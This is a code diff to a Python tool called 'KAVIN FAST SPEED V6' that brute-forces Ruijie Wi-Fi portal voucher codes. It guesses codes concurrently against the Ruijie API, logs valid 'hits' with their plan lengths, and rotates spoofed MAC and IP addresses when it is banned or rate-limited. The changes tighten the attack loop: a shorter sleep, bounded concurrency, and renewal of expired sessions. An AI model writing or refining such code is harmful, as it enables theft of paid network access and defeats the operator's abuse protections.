@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Logic Fixed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Limit Match)
 # Part 1 of 2
 # =====================================================================
 
@@ -36,7 +36,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
 CONCURRENCY_LIMIT = 10
-RATE_LIMIT_SLEEP = 0.2 
+RL_SLEEP = 0.1 
 
 # Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -135,7 +135,7 @@ def auto_detect_portal():
     return None
 
 # ============================================================
-#  SESSION FETCH (V15 အတိုင်း အတု ပြန်ထည့်ထားသည်)
+#  SESSION FETCH & VALIDATION
 # ============================================================
 async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
     base = RUIJIE_WIFIDOG
@@ -177,7 +177,6 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
     except Exception:
         pass
 
-    # V15 လိုပဲ မရရင် Fake Session ပြန်ပေးမယ်
     return {
         'sessionId': f"fake_sess_{random.randint(1000,9999)}",
         'sign': None,
@@ -217,10 +216,17 @@ async def test_code_official(session, sess_data, code, mac, ip):
             if ("request%20limited" in final_url or "request limited" in final_url or "request limited" in low or "too many" in low):
                 return "__RATE_LIMITED__", "1HR"
 
+            # Session Expired (ကျန်သွားရင်) စစ်ဆေးမယ်
+            if "session timed out" in low or "invalid session" in low:
+                return "__SESSION_EXPIRED__", "1HR"
+
             plan = "1HR"
             if "2hr" in low or "2 hour" in low: plan = "2HR"
             elif "12hr" in low or "12 hour" in low: plan = "12HR"
             elif "24hr" in low or "1day" in low or "24 hour" in low: plan = "24HR"
+
+            if "error" in low or "invalid" in low:
+                await asyncio.sleep(RL_SLEEP)
 
             return text, plan
     except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
@@ -257,7 +263,7 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Logic Fixed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Limit Match)
 # Part 2 of 2
 # =====================================================================
 
@@ -293,7 +299,7 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     for h in hits[-10:]:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
-    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • V15 Speed Logic[/dim]", "", "")
+    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • V15 Speed Limit Mode[/dim]", "", "")
 
     footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
     footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
@@ -328,6 +334,8 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     current_ip  = [generate_random_ip()]
     sess_data   = [None]
 
+    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
+
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
     async with aiohttp.ClientSession(connector=conn_limit) as session:
         live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0), refresh_per_second=4, screen=False)
@@ -335,15 +343,18 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
         with live:
             try:
                 while True:
+                    # ⭐ Session မရှိရင် (သို့) ကုန်သွားရင် အသစ်ပြန်ယူမယ်
                     if sess_data[0] is None:
                         current_status[0] = "Session"
+                        live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(time.time() - start_time), current_status[0], hits, (tested / max(1, time.time() - start_time) * 60), current_mac[0], current_ip[0], len(tried_codes)))
+                        
                         res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res == "BAN":
                             current_status[0] = "Banned → Spoof"
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            await asyncio.sleep(0.2)
+                            await asyncio.sleep(RL_SLEEP)
                             continue
 
                         sess_data[0] = res
@@ -363,7 +374,11 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                     if not batch_codes:
                         await asyncio.sleep(0.05); continue
 
-                    tasks = [test_code_official(session, sess_data[0], code, current_mac[0], current_ip[0]) for code in batch_codes]
+                    async def bounded_check(code):
+                        async with semaphore:
+                            return await test_code_official(session, sess_data[0], code, current_mac[0], current_ip[0])
+
+                    tasks = [bounded_check(code) for code in batch_codes]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
 
                     hit_found_in_batch = False
@@ -374,6 +389,13 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
                         if isinstance(res_tuple, Exception): continue
                         res, plan = res_tuple
+
+                        # ⭐ Session ကုန်သွားရင် ချက်ချင်း ပြန်ယူဖို့ သတ်မှတ်မယ်
+                        if res == "__SESSION_EXPIRED__":
+                            current_status[0] = "Session Expired"
+                            sess_data[0] = None
+                            hit_found_in_batch = True
+                            break
 
                         if res == "__RATE_LIMITED__":
                             current_status[0] = "Ban → Spoof"
@@ -439,7 +461,7 @@ def show_banner():
     console.print()
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("Official Ruijie API • V15 Speed Logic", style="bold bright_yellow"), justify="center")
+    console.print(Text("Official Ruijie API • V15 Speed Limit", style="bold bright_yellow"), justify="center")
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print()
 
